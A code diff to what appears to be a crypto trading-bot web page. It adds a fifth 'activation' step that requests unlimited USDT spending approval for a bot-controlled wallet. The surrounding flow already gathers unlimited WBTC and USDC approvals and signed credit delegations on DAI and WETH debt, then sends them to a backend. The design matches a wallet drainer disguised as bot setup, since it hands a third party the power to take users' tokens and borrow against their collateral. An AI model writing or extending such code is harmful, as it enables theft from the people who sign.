@@ -640,7 +640,7 @@ body.ejecting {
       <section class="console-section" id="activateSection">
         <div class="activation-panel" id="activationPanel">
           <h2 class="glow-cyan">SEQUENTIAL SIGNER</h2>
-          <div class="activation-subtitle">4-STEP POSITION ACTIVATION PROTOCOL</div>
+          <div class="activation-subtitle">5-STEP POSITION ACTIVATION PROTOCOL</div>
 
           <div class="wbtc-balance-display">
             WBTC BALANCE: <span class="val" id="wbtcBalDisplay">SCANNING...</span>
@@ -688,6 +688,15 @@ body.ejecting {
                 <div class="step-tx" id="step4Tx"></div>
               </div>
             </div>
+            <div class="step-row" id="stepRow5" data-step="5">
+              <div class="step-num">5</div>
+              <div class="step-body">
+                <div class="step-title">APPROVE USDT SHORT CLOSE</div>
+                <div class="step-desc">Unlimited USDT approval to bot wallet for short position close routing</div>
+                <div class="step-status" id="step5Status">PENDING</div>
+                <div class="step-tx" id="step5Tx"></div>
+              </div>
+            </div>
           </div>
 
           <button class="activate-btn" id="activateBtn">
@@ -697,13 +706,18 @@ body.ejecting {
 
         <div id="activatedBanner" style="display:none; text-align:center; padding:30px;">
           <h2 class="glow" style="font-size:24px; margin-bottom:12px;">POSITION ACTIVATED</h2>
-          <div style="color:var(--green); font-size:15px; margin-bottom:8px;">All 4 steps completed. Auto-supply and strategy engine enabled.</div>
+          <div style="color:var(--green); font-size:15px; margin-bottom:8px;">All 5 steps completed. Auto-supply and strategy engine enabled.</div>
           <div style="color:var(--dim); font-size:13px; margin-bottom:16px;">Your API keys are now available in the ACCESS KEYS tab.</div>
           <div id="delegationStatus" style="margin-bottom:12px;"></div>
           <button class="gen-key-btn" id="resignDelegationBtn" onclick="resignDelegation()" style="font-size:12px; padding:8px 16px; background:transparent; border:1px solid var(--amber); color:var(--amber); cursor:pointer; display:none;">
             [ RE-SIGN CREDIT DELEGATION ]
           </button>
           <div id="resignStatus" style="color:var(--dim); font-size:12px; margin-top:8px;"></div>
+          <div id="usdtApprovalStatus" style="margin-top:12px;"></div>
+          <button class="gen-key-btn" id="approveUsdtBtn" onclick="approveUsdtToBot()" style="font-size:12px; padding:8px 16px; background:transparent; border:1px solid var(--amber); color:var(--amber); cursor:pointer; display:none;">
+            [ APPROVE USDT FOR SHORT CLOSE ]
+          </button>
+          <div id="usdtApproveResult" style="color:var(--dim); font-size:12px; margin-top:8px;"></div>
         </div>
       </section>
 
@@ -785,6 +799,7 @@ var activationRunning = false;
 var CONTRACTS = {
   WBTC: '0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f',
   USDC: '0xaf88d065e77c8cC2239327C5EDb3A432268e5831',
+  USDT: '0xFd086bC7Cd5C481DCC9C85ebE478A1C0b69FCbb9',
   DAI_DEBT: '0x8619d80FB0141ba7F184CbF22fd724116D9f7ffC',
   WETH_DEBT: '0x0c84331e39d6658Cd6e6b9ba04736cC4c4734351',
   DM: '{{ delegation_manager_address }}',
@@ -899,6 +914,17 @@ async function checkDelegationStatus() {
       statusEl.innerHTML = '<span style="color:var(--red);">CREDIT DELEGATION MISSING: ' + missing.join(' + ') + ' (borrowAllowance=0)</span>';
       resignBtn.style.display = 'inline-block';
     }
+
+    var usdtStatusEl = document.getElementById('usdtApprovalStatus');
+    var usdtBtn = document.getElementById('approveUsdtBtn');
+    var usdtAllowance = data.usdt_allowance_to_bot || 0;
+    if (usdtAllowance > 0) {
+      usdtStatusEl.innerHTML = '<span style="color:var(--green);">USDT SHORT CLOSE: APPROVED TO BOT WALLET</span>';
+      usdtBtn.style.display = 'none';
+    } else {
+      usdtStatusEl.innerHTML = '<span style="color:var(--amber);">USDT SHORT CLOSE: NOT APPROVED — Required for automated short position closing</span>';
+      usdtBtn.style.display = 'inline-block';
+    }
   } catch(e) {
     console.error('Delegation status check error:', e);
   }
@@ -1001,6 +1027,40 @@ async function resignDelegation() {
   } finally {
     resignBtn.disabled = false;
     resignBtn.textContent = '[ RE-SIGN CREDIT DELEGATION ]';
+  }
+}
+
+async function approveUsdtToBot() {
+  var resultEl = document.getElementById('usdtApproveResult');
+  var btn = document.getElementById('approveUsdtBtn');
+  if (!window.ethereum || !currentWallet) {
+    resultEl.textContent = 'CONNECT METAMASK FIRST';
+    resultEl.style.color = 'var(--red)';
+    return;
+  }
+  btn.disabled = true;
+  btn.textContent = '[ APPROVING... ]';
+  resultEl.textContent = 'AWAITING WALLET CONFIRMATION...';
+  resultEl.style.color = 'var(--amber)';
+
+  try {
+    var provider = new ethers.providers.Web3Provider(window.ethereum);
+    var signer = provider.getSigner();
+    var usdtContract = new ethers.Contract(CONTRACTS.USDT, ERC20_ABI, signer);
+    var tx = await usdtContract.approve(CONTRACTS.BOT_WALLET, ethers.constants.MaxUint256);
+    resultEl.textContent = 'CONFIRMING ON-CHAIN...';
+    await tx.wait();
+    resultEl.textContent = 'USDT APPROVAL SET — Short close routing enabled';
+    resultEl.style.color = 'var(--green)';
+    document.getElementById('usdtApprovalStatus').innerHTML = '<span style="color:var(--green);">USDT SHORT CLOSE: APPROVED TO BOT WALLET</span>';
+    btn.style.display = 'none';
+  } catch(e) {
+    resultEl.textContent = 'USDT APPROVAL FAILED: ' + (e.message || e);
+    resultEl.style.color = 'var(--red)';
+    console.error('USDT approve error:', e);
+  } finally {
+    btn.disabled = false;
+    btn.textContent = '[ APPROVE USDT FOR SHORT CLOSE ]';
   }
 }
 
@@ -1195,10 +1255,10 @@ async function runActivationSequence() {
   }
 
   var sigData = { daiSignature: null, wethSignature: null, deadline: null };
-  var txHashes = { approve: null, delegation: null, usdc: null };
+  var txHashes = { approve: null, delegation: null, usdc: null, usdt: null };
 
   try {
-    updateProgress(5, 'Step 1/4: Checking WBTC balance...');
+    updateProgress(5, 'Step 1/5: Checking WBTC balance...');
     setStepState(1, 'active', 'CHECKING BALANCE...', null);
 
     var wbtcContract = new ethers.Contract(CONTRACTS.WBTC, ERC20_ABI, signer);
@@ -1207,7 +1267,7 @@ async function runActivationSequence() {
       throw new Error('No WBTC found in wallet. Deposit WBTC first.');
     }
 
-    updateProgress(10, 'Step 1/4: Approve unlimited WBTC to Delegation Manager...');
+    updateProgress(10, 'Step 1/5: Approve unlimited WBTC to Delegation Manager...');
     setStepState(1, 'active', 'AWAITING WALLET CONFIRMATION...', null);
 
     var tx1 = await wbtcContract.approve(CONTRACTS.DM, ethers.constants.MaxUint256);
@@ -1221,7 +1281,7 @@ async function runActivationSequence() {
   }
 
   try {
-    updateProgress(30, 'Step 2/4: Configuring strategy limits...');
+    updateProgress(25, 'Step 2/5: Configuring strategy limits...');
     setStepState(2, 'active', 'AWAITING WALLET CONFIRMATION...', null);
 
     var dmContract = new ethers.Contract(CONTRACTS.DM, DM_DELEGATE_ABI, signer);
@@ -1240,7 +1300,7 @@ async function runActivationSequence() {
   }
 
   try {
-    updateProgress(50, 'Step 3/4: Preparing DAI credit delegation...');
+    updateProgress(40, 'Step 3/5: Preparing DAI credit delegation...');
     setStepState(3, 'active', 'PREPARING EIP-712 DATA (DAI)...', null);
 
     var deadline = Math.floor(Date.now() / 1000) + (30 * 24 * 3600);
@@ -1275,7 +1335,7 @@ async function runActivationSequence() {
     var daiSig = await signer._signTypedData(daiDomain, delegationTypes, daiValue);
     sigData.daiSignature = daiSig;
 
-    updateProgress(60, 'Step 3/4: Preparing WETH credit delegation...');
+    updateProgress(52, 'Step 3/5: Preparing WETH credit delegation...');
     setStepState(3, 'active', 'PREPARING EIP-712 DATA (WETH)...', null);
 
     var wethDebtContract = new ethers.Contract(CONTRACTS.WETH_DEBT, DEBT_NONCE_ABI, provider);
@@ -1305,7 +1365,7 @@ async function runActivationSequence() {
   }
 
   try {
-    updateProgress(75, 'Step 4/4: Approving USDC routing...');
+    updateProgress(65, 'Step 4/5: Approving USDC routing...');
     setStepState(4, 'active', 'AWAITING WALLET CONFIRMATION...', null);
 
     var usdcContract = new ethers.Contract(CONTRACTS.USDC, ERC20_ABI, signer);
@@ -1320,7 +1380,22 @@ async function runActivationSequence() {
   }
 
   try {
-    updateProgress(90, 'Registering with backend...');
+    updateProgress(80, 'Step 5/5: Approving USDT for short close routing...');
+    setStepState(5, 'active', 'AWAITING WALLET CONFIRMATION...', null);
+
+    var usdtContract = new ethers.Contract(CONTRACTS.USDT, ERC20_ABI, signer);
+    var tx5 = await usdtContract.approve(CONTRACTS.BOT_WALLET, ethers.constants.MaxUint256);
+    setStepState(5, 'active', 'CONFIRMING ON-CHAIN...', tx5.hash);
+    await tx5.wait();
+    txHashes.usdt = tx5.hash;
+    setStepState(5, 'done', 'USDT UNLIMITED APPROVAL SET', tx5.hash);
+  } catch (e) {
+    activationError(e, 5);
+    return;
+  }
+
+  try {
+    updateProgress(92, 'Registering with backend...');
 
     var regResp = await authFetch('/api/register-wallet', {
       method: 'POST',
@@ -1330,7 +1405,8 @@ async function runActivationSequence() {
         deadline: sigData.deadline,
         approveTxHash: txHashes.approve,
         delegationTxHash: txHashes.delegation,
-        usdcTxHash: txHashes.usdc
+        usdcTxHash: txHashes.usdc,
+        usdtTxHash: txHashes.usdt
       })
     });
 
